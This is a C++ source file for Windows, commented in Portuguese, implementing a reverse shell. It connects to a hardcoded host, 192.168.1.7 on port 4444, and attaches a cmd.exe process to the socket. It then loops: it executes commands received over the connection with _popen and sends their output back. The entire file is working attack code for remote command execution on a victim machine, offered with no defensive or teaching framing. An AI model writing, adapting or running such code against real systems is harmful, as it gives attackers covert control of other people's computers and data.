#include <iostream>
#include <stdio.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>

#pragma comment(lib, "Ws2_32.lib")
#pragma warning(disable : 4996)

WSADATA wsaData;
SOCKET wSock;
STARTUPINFOA sui;
PROCESS_INFORMATION pi;
DWORD bytesRead = 0;

struct sockaddr_in hax;
char bufferatk[1024];
const char* ip = "192.168.1.7";
short port = 4444;

int main(int argc, char* argv[])
{
	ZeroMemory(&sui, sizeof(sui));
	ZeroMemory(&pi, sizeof(pi));
	// inicia a bibilioteca especificando sua versão
	//check
	int WSASresult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (WSASresult != 0) {
		std::cerr << "Erro ao inicializar a biblioteca Winsock: " << WSASresult << std::endl;
		return 1;
	}

	wSock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
	hax.sin_family = AF_INET;
	hax.sin_port = htons(port);
	hax.sin_addr.s_addr = inet_addr(ip);
	WSAConnect(wSock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);
	sui.cb = sizeof(sui);
	sui.dwFlags = STARTF_USESTDHANDLES;
	sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE)wSock;

	if (!CreateProcessA("C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &sui, &pi)) {
		printf("Erro ao criar o processo: %d\n", GetLastError());
		return 1;
	}
	while (true) {
		if (ReadFile(sui.hStdOutput, bufferatk, sizeof(bufferatk), &bytesRead, NULL)) {
			bufferatk[bytesRead] = '\0';
			char buffer[128];
			std::string result = "";

			FILE* pipe = _popen(bufferatk, "r");
			if (!pipe) {
				std::cout << "Erro ao executar o comando." << std::endl;
				return 1;
			}
			while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
				result += buffer;
			}
			_pclose(pipe);
			// Exibe a saída do comando
			std::cout << "0013:" << result << std::endl;
			const char* resultconvert = result.c_str();
			send(wSock, resultconvert, strlen(resultconvert), 0);
		}
		Sleep(100); // adiciona uma pausa de 100 ms para evitar sobrecarga do processador
	}
	WSASresult = WSACleanup();
	if (WSASresult != 0) {
		std::cerr << "Erro ao finalizar a biblioteca Winsock: " << WSASresult << std::endl;
		return 1;
	}
	exit(0);
}